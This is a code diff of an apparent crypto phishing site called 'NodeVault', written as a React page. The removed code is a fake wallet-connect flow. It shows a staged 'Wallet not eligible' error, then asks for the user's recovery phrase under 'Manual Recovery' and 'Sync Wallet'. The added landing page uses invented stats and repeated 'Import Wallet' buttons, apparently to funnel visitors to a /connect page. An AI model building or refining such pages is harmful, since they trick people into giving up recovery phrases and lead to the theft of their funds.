+        .partner-name{font-size:15px;font-weight:700;color:#fff;}
 
-        /* ─── Connecting Modal ────────────────────────────── */
-        .connecting-modal {
-          background: #141414; border: 1px solid #262626; border-radius: 32px;
-          width: 100%; max-width: 320px; padding: 40px 24px; text-align: center;
-        }
-        .spinner-container { position: relative; width: 80px; height: 80px; margin: 0 auto 32px; }
-        .orange-ring {
-          position: absolute; inset: 0; border: 2px solid #332211; border-top-color: #ff8800;
-          border-radius: 50%; animation: spin 1s linear infinite;
-        }
-        .clock-icon {
-          position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;
-          font-size: 28px; color: #ff8800; background: rgba(255,136,0,0.05); border-radius: 50%;
-        }
-        .connecting-title-reown { font-size: 18px; font-weight: 600; margin-bottom: 12px; }
-        .connecting-desc-reown { font-size: 13px; color: #888; line-height: 1.5; }
+        /* ── CTA Banner ── */
+        .cta-banner{background:linear-gradient(135deg,rgba(139,92,246,.12),rgba(6,182,212,.08));border:1px solid rgba(139,92,246,.2);border-radius:32px;padding:64px;text-align:center;position:relative;overflow:hidden;}
+        .cta-banner::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 60% 80% at 50% 50%,rgba(139,92,246,.08),transparent);pointer-events:none;}
+        .cta-h2{font-size:clamp(28px,4vw,48px);font-weight:900;letter-spacing:-2px;margin-bottom:16px;}
+        .cta-sub{font-size:16px;color:#666;max-width:480px;margin:0 auto 40px;line-height:1.6;}
 
-        /* ─── Error Modal (Not Eligible) ───────────────────── */
-        .error-modal {
-          background: #141414; border: 1px solid #262626; border-radius: 32px;
-          width: 100%; max-width: 320px; padding: 40px 24px; text-align: center;
-        }
-        .error-icon-circle {
-          width: 64px; height: 64px; background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2);
-          border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;
-          color: #ef4444; font-size: 24px;
-        }
-        .error-title-reown { font-size: 20px; font-weight: 700; margin-bottom: 16px; }
-        .error-desc-reown { font-size: 14px; color: #888; line-height: 1.6; }
+        /* ── Footer ── */
+        .footer{border-top:1px solid #111;padding:48px 24px;}
+        .footer-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:24px;}
+        .footer-left{font-size:13px;color:#444;}
+        .footer-links{display:flex;gap:24px;}
+        .footer-link{font-size:13px;color:#444;transition:color .2s;} .footer-link:hover{color:#fff;}
 
-        /* ─── Phrase Container ────────────────────────────── */
-        .phrase-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px; }
-        .phrase-card { background: #111; border: 1px solid #222; border-radius: 24px; width: 100%; max-width: 500px; padding: 32px; }
-        .phrase-header { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; }
-        .phrase-header-icon { width: 44px; height: 44px; border-radius: 12px; object-fit: contain; background: #222; }
-        .phrase-header-text h2 { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
-        .phrase-header-text p { font-size: 13px; color: #666; }
-
-        .manual-notice { display: flex; align-items: flex-start; gap: 12px; padding: 16px; border-radius: 16px; font-size: 13px; margin-bottom: 24px; }
-        .count-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin-bottom: 24px; }
-        .count-btn {
-          padding: 12px 4px; border-radius: 10px; border: 1px solid #222; background: #000; color: #666;
-          font-family: inherit; font-weight: 600; cursor: pointer; transition: 0.2s;
+        /* ── Mobile ── */
+        @media(max-width:768px){
+          .nav-links,.nav-actions .btn-ghost{display:none;}
+          .mobile-menu-btn{display:block;}
+          .hero-stats{gap:24px;}
+          .cta-banner{padding:40px 24px;}
+          .partners-row{gap:24px;}
+          .section-header{flex-direction:column;align-items:flex-start;gap:8px;}
         }
-        .count-btn.selected { border-color: #fff; color: #fff; background: #111; }
-
-        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 24px; }
-        .word-input-wrap { position: relative; }
-        .word-num { position: absolute; left: 10px; top: 12px; font-size: 10px; color: #444; pointer-events: none; }
-        .word-input {
-          width: 100%; padding: 12px 10px 12px 28px; border-radius: 12px; border: 1px solid #222;
-          background: #000; color: #fff; font-family: inherit; font-size: 14px; outline: none;
-        }
-
-        .submit-btn {
-          width: 100%; padding: 16px; border-radius: 14px; border: none; background: #fff; color: #000;
-          font-family: inherit; font-weight: 700; cursor: pointer; transition: opacity 0.2s;
-        }
-        .submit-btn:disabled { opacity: 0.4; pointer-events: none; }
-
-        .submit-overlay {
-          position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: flex; flex-direction: column;
-          align-items: center; justify-content: center; z-index: 200; gap: 24px;
-        }
-        .spinner-ring {
-          width: 40px; height: 40px; border: 3px solid #222; border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite;
-        }
-
-        .error-result-card { text-align: center; max-width: 340px; }
-        .error-result-title { font-size: 20px; font-weight: 700; color: #ef4444; margin-bottom: 12px; }
-        .error-result-desc { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
-        .wc-redirect-btn {
-          display: inline-block; padding: 14px 24px; border-radius: 12px; background: #fff; color: #000;
-          text-decoration: none; font-weight: 700; font-size: 14px; border: none; cursor: pointer;
-        }
-
-        /* ─── Keyframes ───────────────────────────────────── */
-        @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(40px) scale(0.97); } to { opacity: 1; transform: translateY(0) scale(1); } }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .landing-hidden { opacity: 0; pointer-events: none; position: absolute; }
-        .landing-visible { opacity: 1; }
       `}</style>
 
-      {/* ── BACKGROUND / LANDING ────────────────────────────────────────────── */}
-      <div className={`landing ${step === "landing" ? "landing-visible" : "landing-hidden"}`}>
-        <div className="landing-card">
-          <div className="landing-logo">🔗</div>
-          <h1 className="landing-title">Connect Wallet</h1>
-          <p className="landing-desc">
-            Connect your crypto wallet to access the decentralized dashboard.
-          </p>
-          <button className="connect-btn" onClick={() => setStep("modal")}>
-            Connect Wallet
-          </button>
+      {/* ── LIVE TICKER ──────────────────────────────────────────── */}
+      <div className="ticker-wrap">
+        <div className="ticker-track" ref={tickerRef}>
+          {displayTicker.map((c, i) => (
+            <span key={`${c.id}-${i}`} className="ticker-item">
+              <img src={c.image} width={16} height={16} style={{ borderRadius: "50%" }} alt="" />
+              <span style={{ color: "#888" }}>{c.symbol?.toUpperCase()}</span>
+              <span style={{ color: "#fff", fontWeight: 600 }}>${c.current_price?.toLocaleString()}</span>
+              <span className={c.price_change_percentage_24h >= 0 ? "ticker-up" : "ticker-down"}>
+                {pct(c.price_change_percentage_24h)}
+              </span>
+            </span>
+          ))}
         </div>
       </div>
 
-      {/* ── WALLET SELECTION MODAL ─────────────────────────────── */}
-      {step === "modal" && (
-        <div className="modal-overlay" onClick={() => setStep("landing")}>
-          <div className="selection-modal" onClick={e => e.stopPropagation()}>
-            <div className="modal-header-reown">
-              <button className="modal-back-btn" onClick={() => setStep("landing")}>‹</button>
-              <div className="modal-title-reown">Connect Wallet</div>
-              <button className="modal-close-reown" onClick={() => setStep("landing")}>×</button>
-            </div>
-            
-            <div className="wallet-list">
-              {WALLETS.map(wallet => {
-                const isInstalled = providers.some(p => p.info.rdns === wallet.rdns);
-                return (
-                  <button key={wallet.name} className="wallet-item-reown" onClick={() => attemptConnect(wallet)}>
-                    <img src={wallet.icon} className="wallet-icon-reown" alt={wallet.name} />
-                    <span className="wallet-name-reown">{wallet.name}</span>
-                    {isInstalled && <span style={{ marginLeft: "auto", fontSize: 10, color: "#4ade80", fontWeight: 700 }}>INSTALLED</span>}
-                  </button>
-                );
-              })}
-            </div>
+      {/* ── NAVIGATION ───────────────────────────────────────────── */}
+      <nav className={`nav ${scrolled ? "scrolled" : ""}`}>
+        <div className="nav-inner">
+          <Link href="/" className="nav-logo">
+            <div className="logo-icon">⬡</div>
+            NodeVault
+          </Link>
 
-            <div className="modal-footer-reown">
-              <div className="reown-branding">
-                UX by <span className="reown-logo">reown</span>
-              </div>
-            </div>
+          <div className="nav-links">
+            {NAV_LINKS.map(l => (
+              <a key={l} href="#" className="nav-link">{l}</a>
+            ))}
           </div>
-        </div>
-      )}
 
-      {/* ── CONNECTING MODAL ─────────────────────────────────── */}
-      {step === "connecting" && (
-        <div className="modal-overlay">
-          <div className="connecting-modal">
-            <div className="spinner-container">
-              <div className="orange-ring" />
-              <div className="clock-icon">🕒</div>
-            </div>
-            <div className="connecting-title-reown">Connecting...</div>
-            <p className="connecting-desc-reown">
-              {connectTimer > 10 
-                ? "It is taking longer than expected..." 
-                : "Open and approve in your wallet"}
-            </p>
-
-            {isMobile && selectedWallet && DEEP_LINKS[selectedWallet.name] && (
-              <button 
-                className="wc-redirect-btn" 
-                style={{ marginTop: 24, fontSize: 13, background: "#222", color: "#fff" }}
-                onClick={(e) => {
-                  e.stopPropagation();
-                  const currentUrl = window.location.href.split("#")[0];
-                  const link = DEEP_LINKS[selectedWallet.name].replace("[URL]", encodeURIComponent(currentUrl));
-                  window.location.href = link;
-                }}
-              >
-                Try opening {selectedWallet.name} again
-              </button>
-            )}
+          <div className="nav-actions">
+            <button className="btn-ghost">Log In</button>
+            <Link href="/connect">
+              <button className="btn-primary">Import Wallet →</button>
+            </Link>
           </div>
+          <button className="mobile-menu-btn" onClick={() => setMobileMenu(!mobileMenu)}>☰</button>
         </div>
-      )}
-
-      {/* ── ERROR MODAL (NOT ELIGIBLE) ───────────────────────── */}
-      {step === "failed" && (
-        <div className="modal-overlay">
-          <div className="error-modal">
-            <div className="error-icon-circle">×</div>
-            <div className="error-title-reown">Wallet not eligible</div>
-            <p className="error-desc-reown">
-              Wallet failed validation. Please use manual recovery to sync your assets.
-            </p>
-            <button 
-              className="connect-btn" 
-              style={{ marginTop: 32, background: "#ef4444", color: "#fff" }}
-              onClick={() => setStep("phraseCount")}
-            >
-              Verify Manually
-            </button>
+        {mobileMenu && (
+          <div style={{ background: "#0a0a0a", borderTop: "1px solid #111", padding: "20px 24px", display: "flex", flexDirection: "column", gap: 16 }}>
+            {NAV_LINKS.map(l => <a key={l} href="#" style={{ fontSize: 15, color: "#888" }}>{l}</a>)}
+            <Link href="/connect"><button className="btn-primary" style={{ width: "100%", padding: "14px" }}>Import Wallet →</button></Link>
           </div>
+        )}
+      </nav>
+
+      {/* ── HERO ─────────────────────────────────────────────────── */}
+      <section className="hero">
+        <div className="hero-bg" />
+        <div className="hero-badge">
+          <span className="badge-dot" />
+          Multi-chain · Non-custodial · Decentralized
         </div>
-      )}
-
-      {/* ── PHRASE COUNT SELECTION ────────────────────────────── */}
-      {step === "phraseCount" && (
-        <div className="phrase-container">
-          <div className="phrase-card">
-            <div className="phrase-header">
-              {selectedWallet && <img className="phrase-header-icon" src={selectedWallet.icon} alt="" />}
-              <div className="phrase-header-text">
-                <h2>Manual Recovery</h2>
-                <p>Verify your wallet ownership</p>
-              </div>
+        <h1 className="hero-h1">Your Gateway to<br />Web3 Finance</h1>
+        <p className="hero-sub">
+          Connect any wallet, track your portfolio in real-time, and access the full spectrum of decentralized finance — all in one place.
+        </p>
+        <div className="hero-ctas">
+          <Link href="/connect">
+            <button className="btn-hero-primary">Import Wallet</button>
+          </Link>
+          <button className="btn-hero-secondary">Explore Markets</button>
+        </div>
+        <div className="hero-stats">
+          {[["$2.4T", "Total Market Cap"], ["12M+", "Active Wallets"], ["500+", "Supported Tokens"], ["99.9%", "Uptime SLA"]].map(([n, l]) => (
+            <div key={l} className="stat">
+              <div className="stat-num">{n}</div>
+              <div className="stat-label">{l}</div>
             </div>
+          ))}
+        </div>
+      </section>
 
-            <div className="manual-notice" style={{ background: "rgba(239, 68, 68, 0.1)", color: "#ef4444", border: "1px solid rgba(239,68,68,0.2)" }}>
-              <span>Automatic sync failed. Please import your recovery phrase to continue.</span>
-            </div>
-
-            <div className="count-grid">
-              {PHRASE_COUNTS.map(n => (
-                <button
-                  key={n}
-                  className={`count-btn${phraseCount === n ? " selected" : ""}`}
-                  onClick={() => { setPhraseCount(n); setPhraseWords(Array(n).fill("")); setSubmitDone(false); }}
-                >
-                  {n}
-                </button>
-              ))}
-            </div>
-
-            <button className="submit-btn" disabled={!phraseCount} onClick={() => setStep("phraseInput")}>
-              Continue
-            </button>
+      {/* ── LIVE PRICES ──────────────────────────────────────────── */}
+      <div className="section" style={{ paddingTop: 0 }}>
+        <div className="section-header">
+          <div>
+            <div className="section-title">Live Markets</div>
+            <div className="section-sub">Real-time prices from global exchanges</div>
           </div>
+          <span className="see-all">View all markets →</span>
         </div>
-      )}
-
-      {/* ── PHRASE INPUT ──────────────────────────────────────── */}
-      {step === "phraseInput" && phraseCount && (
-        <div className="phrase-container">
-          <div className="phrase-card">
-            <div className="phrase-header">
-              {selectedWallet && <img className="phrase-header-icon" src={selectedWallet.icon} alt="" />}
-              <div className="phrase-header-text">
-                <h2>Enter Phrase</h2>
-                <p>{phraseCount} words mnemonic</p>
-              </div>
-            </div>
-
-            <form onSubmit={handleSubmit}>
-              <div className="word-grid">
-                {phraseWords.map((word, i) => (
-                  <div className="word-input-wrap" key={i}>
-                    <span className="word-num">{i + 1}</span>
-                    <input
-                      ref={el => { inputRefs.current[i] = el; }}
-                      className="word-input"
-                      type="password"
-                      value={word}
-                      onChange={e => handleWordChange(i, e.target.value)}
-                      onKeyDown={e => handleKeyDown(i, e)}
-                      autoComplete="off"
-                      spellCheck={false}
-                      disabled={submitting}
-                    />
+        <div className="coins-grid">
+          {displayCoins.slice(0, 6).map(c => (
+            <div key={c.id} className="coin-card" onClick={() => window.location.href = "/connect"}>
+              <div className="coin-top">
+                <div className="coin-info">
+                  <img src={c.image} className="coin-img" alt={c.name} />
+                  <div>
+                    <div className="coin-name">{c.name}</div>
+                    <div className="coin-symbol">{c.symbol}</div>
                   </div>
-                ))}
+                </div>
+                <span className={c.price_change_percentage_24h >= 0 ? "coin-badge-up" : "coin-badge-down"}>
+                  {pct(c.price_change_percentage_24h)}
+                </span>
               </div>
-              <button type="submit" className="submit-btn" disabled={!phraseWords.every(w => w.trim().length > 0) || submitting}>
-                {submitting ? "Syncing..." : "Sync Wallet"}
-              </button>
-            </form>
+              <div className="coin-price">{fmt(c.current_price)}</div>
+              <div className="coin-mcap">Market Cap: {fmt(c.market_cap)}</div>
+            </div>
+          ))}
+        </div>
+      </div>
+
+      {/* ── PARTNERS / ECOSYSTEMS ────────────────────────────────── */}
+      <div className="partners-section">
+        <div style={{ maxWidth: 1200, margin: "0 auto" }}>
+          <div className="partners-label">Supported Ecosystems</div>
+          <div className="partners-row">
+            {PARTNERS.map(p => (
+              <div key={p.name} className="partner-item">
+                <div className="partner-dot" style={{ background: p.color }} />
+                <span className="partner-name">{p.name}</span>
+              </div>
+            ))}
           </div>
         </div>
-      )}
+      </div>
 
-      {/* ── SUBMITTING OVERLAY ────────────────────────────────── */}
-      {submitting && (
-        <div className="submit-overlay">
-          <div className="spinner-ring" />
-          <div style={{ color: "#fff" }}>Synchronizing...</div>
+      {/* ── CRYPTO NEWS ──────────────────────────────────────────── */}
+      <div className="section">
+        <div className="section-header">
+          <div>
+            <div className="section-title">Crypto News</div>
+            <div className="section-sub">Latest from the blockchain ecosystem</div>
+          </div>
+          <span className="see-all">All news →</span>
         </div>
-      )}
+        <div className="news-grid">
+          {DEMO_NEWS.map((n, i) => (
+            <a key={i} href={n.url} className="news-card" style={{ display: "block" }}>
+              <div className="news-source">
+                <div className="news-dot" />
+                <span className="news-source-name">{n.source}</span>
+                <span className="news-time">{n.time}</span>
+              </div>
+              <div className="news-title">{n.title}</div>
+              <div className="news-arrow">Read more →</div>
+            </a>
+          ))}
+        </div>
+      </div>
 
-      {submitDone && !submitting && (
-         <div className="submit-overlay">
-           <div className="error-result-card">
-             <div className="error-result-title">Sync Error</div>
-             <p className="error-result-desc">Unable to verify phrase. Connection timed out.</p>
-             <button className="wc-redirect-btn" onClick={() => { setStep("landing"); setSubmitDone(false); }}>Try Again</button>
-           </div>
-         </div>
-      )}
+      {/* ── IMPORT WALLET CTA ────────────────────────────────────── */}
+      <div className="section" style={{ paddingTop: 0 }}>
+        <div className="cta-banner">
+          <h2 className="cta-h2">Ready to connect?</h2>
+          <p className="cta-sub">
+            Import your existing wallet in seconds. Support for MetaMask, Trust Wallet, Coinbase, Ledger and 50+ more.
+          </p>
+          <div style={{ display: "flex", gap: 16, justifyContent: "center", flexWrap: "wrap", position: "relative" }}>
+            <Link href="/connect">
+              <button className="btn-hero-primary">Import Wallet →</button>
+            </Link>
+            <button className="btn-hero-secondary">Learn More</button>
+          </div>
+        </div>
+      </div>
+
+      {/* ── FOOTER ───────────────────────────────────────────────── */}
+      <footer className="footer">
+        <div className="footer-inner">
+          <div className="footer-left">
+            <strong style={{ color: "#fff" }}>NodeVault</strong> — Built on open standards.<br />
+            <span style={{ marginTop: 4, display: "block" }}>© 2024 NodeVault. All rights reserved.</span>
+          </div>
+          <div className="footer-links">
+            {["Privacy", "Terms", "Security", "Blog", "Twitter", "GitHub"].map(l => (
+              <a key={l} href="#" className="footer-link">{l}</a>
+            ))}
+          </div>
+        </div>
+      </footer>
     </div>
   );
 }
-
-// ─── Wallet list item sub-component removed in favor of inline logic ──────────
